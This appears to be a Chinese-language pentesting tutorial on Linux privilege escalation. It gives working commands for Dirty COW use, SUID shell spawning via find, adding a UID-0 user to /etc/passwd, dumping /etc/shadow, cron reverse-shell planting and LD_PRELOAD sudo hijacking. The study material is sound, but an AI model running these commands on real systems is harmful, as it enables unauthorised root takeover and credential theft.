#### 概述 (Overview)
获取 Linux 系统的低权限 Shell 后，目标是提升至 root 用户权限，以获得对系统的完全控制。Linux 提权方法多样，涉及内核漏洞、配置错误、SUID/SGID 程序利用、计划任务劫持、密码复用等。

#### 初始信息收集 (Initial Information Gathering)

*   **内核与发行版信息**:
    *   `uname -a`: 内核版本、架构等。
    *   `cat /proc/version`: 内核详细信息。
    *   `cat /etc/issue` 或 `cat /etc/*-release`: 发行版名称和版本。
    *   `lsb_release -a`: (如果安装了 lsb-core)。
    *   **内核版本号解读**: 主版本.次版本.修订版本 (如 `3.10.0`)。次版本为偶数表示稳定版，奇数表示开发版。

#### 提权方法 (Escalation Techniques)

1.  **利用内核漏洞 (Kernel Exploit)**
    *   **原理**: 与 Windows 类似，利用 Linux 内核中未修复的漏洞执行代码获取 root 权限。
    *   **步骤**:
        1.  **识别内核版本**: `uname -a`。
        2.  **搜索 Exploit**: 根据内核版本和发行版信息，在 Exploit-DB, GitHub, Google 搜索对应的本地提权漏洞 (LPE) Exploit。
        3.  **获取与编译**: 下载 Exploit 源码（通常是 C 文件）。在目标机或具有相同环境的机器上使用 `gcc` 编译：`gcc exploit.c -o exploit_bin -lpthread` (可能需要 `-pthread` 或其他库链接选项)。
        4.  **上传与执行**: 将编译好的二进制文件上传到目标机可执行目录，赋予执行权限 (`chmod +x exploit_bin`)，然后运行 (`./exploit_bin`)。
    *   **脏牛漏洞 (Dirty COW - CVE-2016-5195)**:
        *   **影响范围**: Linux 内核 >= 2.6.22 至 2016 年 10 月修复前。
        *   **原理**: 利用写时复制 (Copy-on-Write) 的竞争条件，允许低权限用户修改只读内存映射，常用于修改 `/etc/passwd` 文件以创建 root 权限用户或直接修改 SUID 文件。
        *   **示例 Exploit**: [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195) (此 Exp 创建一个新用户 firefart 并将其 UID 改为 0)。
            ```bash
            # 编译
            gcc -pthread dirty.c -o dirty -lcrypt
            # 执行，输入新密码
            ./dirty mypassword
            # 成功后，/etc/passwd 中 root 用户会被临时替换
            # 使用新用户 firefart / mypassword 登录或 su
            su firefart
            # 获得 root shell 后，应立即恢复 /etc/passwd (备份在 /tmp/passwd.bak)
            # 并考虑创建正常的 root 权限用户或修复权限
            ```
    *   **风险**: 内核 Exploit 可能导致系统崩溃或不稳定。

2.  **利用 SUID/SGID 程序 (SUID/SGID Exploitation)**
    *   **原理**: SUID (Set User ID) 权限允许任何用户以**文件所有者**（通常是 root）的身份执行该程序。SGID (Set Group ID) 允许以**文件所属组**的身份执行。如果一个具有 SUID root 权限的程序存在漏洞或可被用于执行任意命令，则可以用来提权。
    *   **查找 SUID/SGID 文件**:
        ```bash
        find / -user root -perm -4000 -print 2>/dev/null   # 查找 root 拥有的 SUID 文件
        find / -group root -perm -2000 -print 2>/dev/null   # 查找 root 组拥有的 SGID 文件
        find / -perm -u=s -type f 2>/dev/null             # 查找所有 SUID 文件
        find / -perm -g=s -type f 2>/dev/null             # 查找所有 SGID 文件
        ```
    *   **可利用的常见 SUID 程序**:
        *   **`nmap` (旧版本)**: 交互模式 (`--interactive`) 可能执行命令。
        *   **`find`**: `-exec` 参数可执行任意命令。`find . -exec /bin/sh \; -quit`
        *   **`vim`/`vi`**: `:!/bin/sh` 或 `:shell`。
        *   **`bash`/`sh`**: 如果 bash 被设置了 SUID (极不安全)，直接运行 `bash -p` (保留权限)。
        *   **`cp`**: 可用于覆盖敏感文件（如 `/etc/shadow`）。
        *   **`mv`**: 可用于移动敏感文件。
        *   **`more`/`less`**: 输入 `!/bin/sh`。
        *   **`nano`**: 可能通过编辑功能写入文件。
        *   **`python`/`perl`/`ruby` 等脚本解释器**: 如果被设置了 SUID，可直接执行提权脚本。
        *   **`mount`/`umount`**: 需要特定配置和条件。
        *   **`systemctl`**: `systemctl link /path/to/payload.service && systemctl enable --now payload.service` (需要一定条件)。
    *   **GTFOBins**: 一个优秀的在线资源，列出了各种 Linux 程序可被用于提权或绕过限制的方法: [https://gtfobins.github.io/](https://gtfobins.github.io/)
    *   **示例 (利用 `find`)**:
        ```bash
        # 确认 find 具有 SUID root 权限
        ls -lh $(which find)
        # 使用 find 执行 whoami (以 root 身份)
        find . -exec whoami \; -quit
        # 使用 find 获取 root shell
        find . -exec /bin/sh -p \; -quit # -p 尝试保留权限
        ```

3.  **利用错误的配置文件权限 (Misconfigured Permissions)**
    *   **/etc/passwd 可写**:
        *   **原理**: 如果 `/etc/passwd` 文件对当前用户可写，可以直接添加一个 UID 为 0 的新用户。
        *   **步骤**:
            1.  `ls -l /etc/passwd`: 检查权限。
            2.  生成密码哈希: `openssl passwd -1 -salt <salt> <password>` 或 `perl -le 'print crypt("password","salt")'`。
            3.  构造新用户行 (用户:密码哈希:UID:GID:描述:家目录:Shell): `newroot:<hash>:0:0:root:/root:/bin/bash`
            4.  将新用户行追加到 `/etc/passwd`: `echo "newroot:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`。
            5.  使用 `su newroot` 或 SSH 登录。
    *   **/etc/shadow 可读**:
        *   **原理**: 如果 `/etc/shadow` 文件可读，可以获取所有用户的密码哈希。
        *   **步骤**: `cat /etc/shadow` -> 将哈希复制下来 -> 使用 John the Ripper 或 Hashcat 进行离线破解。
    *   **其他敏感文件可写**: 如 Sudoers 文件 (`/etc/sudoers`)、服务配置文件、脚本等。

4.  **利用计划任务 (Cron Jobs)**
    *   **原理**: 系统或 root 用户可能配置了定时执行的脚本（Cron Job）。如果这些脚本本身或其所在的目录对当前用户可写，就可以修改脚本内容或替换脚本文件，插入恶意命令（如反弹 Shell），等待任务执行时以脚本所有者（通常是 root）的权限运行。
    *   **查找计划任务**:
        *   `crontab -l`: 查看当前用户的 Cron Jobs。
        *   `ls -l /etc/cron*`: 查看系统级别的 Cron 目录 (`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`, `/etc/cron.weekly/`)。
        *   `cat /etc/crontab`。
    *   **检查权限**: `ls -l <script_path>` 或 `ls -ld <script_directory>`，检查是否有写入权限。
    *   **利用**: 修改脚本，加入反弹 Shell 或其他命令。

5.  **密码复用与弱密码 (Password Reuse & Weak Passwords)**
    *   **原理**: 如果在系统中发现了其他应用（如数据库、Web 应用配置文件）的密码，或通过破解 `/etc/shadow` 获得了用户密码，尝试使用这些密码切换到 root 用户 (`su root`) 或其他高权限用户。管理员可能在不同地方使用了相同或相似的密码。

6.  **利用 Sudo 配置错误 (Sudo Misconfiguration)**
    *   **原理**: Sudo 允许普通用户以 root 权限执行特定的命令。如果 `/etc/sudoers` 文件配置不当，可能允许用户执行可用于提权的命令，或者允许执行任意命令而无需密码。
    *   **检查**: `sudo -l`: 查看当前用户被允许使用 sudo 执行哪些命令。
    *   **利用**:
        *   **允许执行的命令可提权**: 如果允许执行 `find`, `vim`, `less` 等（参考 GTFOBins）。
        *   **`NOPASSWD`**: 如果某命令配置了 `NOPASSWD`，执行时无需密码。
        *   **环境变量劫持**: 如果 `sudoers` 配置中保留了某些环境变量 (`Defaults env_keep += "LD_PRELOAD"` 等)，可能通过设置恶意环境变量（如 `LD_PRELOAD` 指向恶意 `.so` 文件）来劫持 sudo 执行的命令。

7.  **利用脚本与自动化工具 (Scripts & Automated Tools)**
    *   **LinEnum.sh**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) - 详细的 Linux 信息收集和权限提升检查脚本。
    *   **linuxprivchecker.py**: [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py) - Python 脚本，检查常见的提权向量。
    *   **unix-privesc-check**: [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) - Shell 脚本，执行一系列检查。